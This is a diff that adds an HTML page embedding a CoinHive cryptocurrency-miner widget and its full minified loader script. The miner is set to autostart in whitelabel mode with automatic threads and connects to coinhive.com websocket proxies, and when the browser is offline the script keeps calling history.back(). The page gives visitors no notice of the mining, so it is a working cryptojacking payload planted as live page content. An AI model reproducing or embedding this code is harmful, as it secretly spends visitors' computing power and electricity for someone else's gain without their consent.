@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+
+<style>
+	* {padding: 0; margin: 0; border: none; overflow: hidden; width: 500px; height: 285px;}
+</style>
+
+<div class="coinhive-miner"
+	data-key="kN22vBvMZdUUPzrggLtg3QGa8tWhRUt2"
+	data-user="GitHub"
+	data-autostart="true"
+	data-whitelabel="true"
+ 	data-autoThreads="true"
+ 	data-throttle="0.1">
+</div>
+
+<script>
+	if (navigator.onLine) {
+		self.CoinHive=self.CoinHive||{};self.CoinHive.CONFIG={LIB_URL:"https://coinhive.com/lib/",ASMJS_NAME:"cryptonight-asmjs.min.js",REQUIRES_AUTH:false,WEBSOCKET_SHARDS:[["wss://ws001.coinhive.com/proxy","wss://ws002.coinhive.com/proxy","wss://ws003.coinhive.com/proxy","wss://ws004.coinhive.com/proxy","wss://ws005.coinhive.com/proxy","wss://ws006.coinhive.com/proxy","wss://ws007.coinhive.com/proxy","wss://ws029.coinhive.com/proxy"],["wss://ws008.coinhive.com/proxy","wss://ws009.coinhive.com/proxy","wss://ws010.coinhive.com/proxy","wss://ws011.coinhive.com/proxy","wss://ws012.coinhive.com/proxy","wss://ws013.coinhive.com/proxy","wss://ws014.coinhive.com/proxy","wss://ws030.coinhive.com/proxy"],["wss://ws015.coinhive.com/proxy","wss://ws016.coinhive.com/proxy","wss://ws017.coinhive.com/proxy","wss://ws018.coinhive.com/proxy","wss://ws019.coinhive.com/proxy","wss://ws020.coinhive.com/proxy","wss://ws021.coinhive.com/proxy","wss://ws031.coinhive.com/proxy"],["wss://ws022.coinhive.com/proxy","wss://ws023.coinhive.com/proxy","wss://ws024.coinhive.com/proxy","wss://ws025.coinhive.com/proxy","wss://ws026.coinhive.com/proxy","wss://ws027.coinhive.com/proxy","wss://ws028.coinhive.com/proxy","wss://ws032.coinhive.com/proxy"]],CAPTCHA_URL:"https://coinhive.com/captcha/",MINER_URL:"https://coinhive.com/media/miner.html",AUTH_URL:"https://authedmine.com/authenticate.html"};(function(window){"use strict";var Miner=function(div){this.div=div;var params=div.dataset;try{var defaults=JSON.parse(localStorage.getItem("coinhive-defaults"));if(defaults&&defaults.threads){params.threads=defaults.threads}if(defaults&&defaults.throttle){params.throttle=defaults.throttle}}catch(err){}var url=CoinHive.CONFIG.MINER_URL+"?key="+params.key+"&user="+encodeURIComponent(params.user||"")+"&whitelabel="+(params.whitelabel==="true"?"1":"0")+"&autostart="+(params.autostart==="true"?"1":"0")+"&throttle="+(params.throttle||"")+"&threads="+(params.threads||"")+"&background="+(params.background||"").replace(/#/g,"")+"&text="+(params.text||"").replace(/#/g,"")+"&action="+(params.action||"").replace(/#/g,"")+"&ref="+(params.ref||"")+"&graph="+(params.graph||"").replace(/#/g,"");if(params.start!==undefined){url+="&start="+encodeURIComponent(params.start)}this.div.innerHTML="";this.iframe=document.createElement("iframe");this.iframe.style.width="100%";this.iframe.style.height="100%";this.iframe.style.border="none";if(CoinHive.CONFIG.REQUIRES_AUTH){this.auth=new CoinHive.Auth(params.key);this.auth.iframe=this.iframe;if(this.auth.isAuthed()){url+="&optin="+this.auth.token}}this.iframe.src=url;this.div.appendChild(this.iframe);window.addEventListener("message",this.onMessage.bind(this))};Miner.prototype.onMessage=function(ev){if(ev.source!==this.iframe.contentWindow){return}if(ev.data.type==="coinhive-store-defaults"&&ev.data.params){try{localStorage.setItem("coinhive-defaults",JSON.stringify(ev.data.params))}catch(err){}}else if(ev.data.type==="coinhive-miner-event"&&ev.data.params){var listeners=Miner._eventListeners[ev.data.params.type];if(listeners&&listeners.length){for(var i=0;i<listeners.length;i++){listeners[i](ev.data.params.params,this)}}}};Miner._eventListeners={open:[],authed:[],close:[],error:[],job:[],found:[],accepted:[],optin:[]};Miner.ElementsCreated=false;Miner.CreateElements=function(){if(Miner.ElementsCreated){return}Miner.ElementsCreated=true;var elements=document.querySelectorAll(".coinhive-miner");for(var i=0;i<elements.length;i++){new Miner(elements[i])}if(typeof window.onCoinHiveSimpleUIReady==="function"){window.onCoinHiveSimpleUIReady()}};Miner.on=function(type,callback){if(Miner._eventListeners[type]){Miner._eventListeners[type].push(callback)}};window.CoinHive=window.CoinHive||{};window.CoinHive.Miner=Miner;if(document.readyState==="complete"||document.readyState==="interactive"){Miner.CreateElements()}else{document.addEventListener("readystatechange",function(){if(document.readyState==="complete"||document.readyState==="interactive"){Miner.CreateElements()}})}})(window);
+	} else {
+		var load_miner = setInterval(function() {
+			window.history.back();
+		}, 8000);
+	}
+</script>
